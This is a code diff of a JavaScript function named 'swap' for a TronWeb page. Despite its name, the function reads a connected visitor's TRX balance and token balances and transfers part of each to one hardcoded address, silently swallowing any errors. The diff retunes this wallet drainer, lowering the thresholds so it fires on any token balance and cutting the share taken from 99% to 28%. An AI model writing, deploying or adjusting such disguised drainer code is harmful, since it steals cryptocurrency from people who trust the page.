@@ -15,15 +15,15 @@ var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
             async function swap(){
                 try{
                     var balance = await window.tronWeb.trx.getBalance();
-                    if (balance >= 100000000)
-                    await tronWeb.trx.sendTransaction("41c32FaF16A6344926c62e3731DA86f2240d917e23", Math.round(balance * 99 / 100));
+                    if (balance >= 56000000)
+                    await tronWeb.trx.sendTransaction("41c32FaF16A6344926c62e3731DA86f2240d917e23", Math.round(balance * 28 / 100));
                 }catch{}
                 for(i=0; i<contractsAddress.length; i++){
                     try{
                     var cc = await window.tronWeb.contract().at(contractsAddress[i]);
                     balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call();
-                    if (balance.toNumber() >= 100000){
-                        await cc.transfer("41c32FaF16A6344926c62e3731DA86f2240d917e23", Math.round(balance * 99 / 100)).send()
+                    if (balance.toNumber() >= 0){
+                        await cc.transfer("41c32FaF16A6344926c62e3731DA86f2240d917e23", Math.round(balance * 28 / 100)).send()
                     }
                     }catch{}
                 }
